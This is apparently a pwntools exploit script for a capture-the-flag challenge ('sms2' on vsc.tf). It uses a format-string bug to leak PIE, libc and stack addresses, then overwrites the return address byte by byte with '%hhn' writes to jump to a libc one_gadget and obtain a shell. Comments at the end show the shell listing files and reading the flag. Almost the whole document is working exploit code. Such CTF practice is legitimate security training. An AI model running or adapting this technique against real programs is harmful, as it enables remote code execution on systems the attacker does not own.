#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
brva 0x1322
brva 0x144D
continue
c 2
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'vsc.tf'
    port = int(args.PORT or 7002)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


# my input pos=12
sla(b'Message: ', cyclic(100))
sla(b'Your name: ', b'%3$p%9$p%8$p')


ru(b'Bushy-tailed farewells,\n', drop=True)
leak = rl()
_, libcc, pie, stack = leak.decode().strip().replace('0x', ' ').split(' ')

pie_leak = int(pie, 16)
libc_leak = int(libcc, 16)
stack = int(stack, 16)

info(f'pie_leak: {pie_leak:#x}')
info(f'libc_leak: {libc_leak:#x}')
info(f'stack: {stack:#x}')

exe.address = pie_leak -0x13bb
info(f'exe.address: {exe.address:#x}')

libc.address = libc_leak -0x114887
info(f'libc.address: {libc.address:#x}')


libc_got = libc.address + 0x21a018
system = libc.sym.system
ret_from_squirell_set = stack+8


def loop(v):
    sla(b'Message: ', flat(
        ret_from_squirell_set
    ))

    fmt = f'%{v}c%12$hhn'
    sla(b'Your name: ', fmt.encode())

loop(0x34)

gg = "330311 330323 330344 330352 527299 527312 527317 527322 965761 965765 965768 965858 965951 965955 965959 1104322 1104330 1104335 1104345".split(' ')
gg = list(map(int, gg))
g = libc.address + gg[0]
info(f'g: {g:#x}')

for i in range(5):
    __libc_start_call_main = stack+0x18+i
    sla(b'Message: ', flat(
        __libc_start_call_main
    ))

    fmt = f'%{(g >> i*8) & 0xFF}c%12$hhn'
    info(fmt)
    sla(b'Your name: ', fmt.encode())

    if i != 4:
        loop(0x34)
    else:
        loop(0x5C)

ia()

# $ ls
# flag.txt
# ld-2.35.so
# libc-2.35.so
# sms2
# $ cat flag.txt
# vsctf{m4yb3_th3_squ1rr3l5_5h0uld_ju5t_5t0p_us1ng_pr1ntf}
